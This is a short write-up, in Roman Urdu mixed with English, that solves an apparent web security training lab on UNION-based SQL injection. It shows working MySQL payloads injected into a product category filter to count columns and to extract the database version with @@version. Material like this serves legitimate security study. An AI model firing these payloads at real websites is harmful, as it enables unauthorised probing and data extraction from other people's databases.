### Step-by-Step Solution
**Step 1: Intercept Request**
 * Lab ko open karo aur kisi bhi category (jaise Gifts ya Pets) par click karo.
 * Burp Suite mein request ko intercept karo, ya URL bar mein directly category parameter ko edit karo:
   ```text
   /filter?category=Gifts
   
   ```
**Step 2: Columns count aur data type verify karna**
 * Hum category parameter ke aage payload lagayein ge. MySQL ke liye comment # (ya URL-encoded %23) use hota hai:

   ```
   '+UNION+SELECT+'abc','def'#
   
   ```

`#` ko haar haal main encode krky bhejna hai jaisy %23 warna server error ajaye ga 500 

 * Is se verify ho jata hai ke total 2 columns hain aur dono text format support karte hain.
**Step 3: Database version extract karna (Final Step)**
 * Ab version nikalne ke liye @@version function ka istemal karein ge. Dusre column ko NULL rakh dein ge:
   ```text
   '+UNION+SELECT+@@version,+NULL%23
   
   ```
 * *(Note: Agar browser/Burp se bhej rahe ho toh # ko URL encode karke %23 likhna: '+UNION+SELECT+@@version,+NULL%23)*
Jab yeh payload run hoga, toh page par SQL Server / MySQL ka version string show ho jaye ga aur lab **Solved** ho jaye gi!
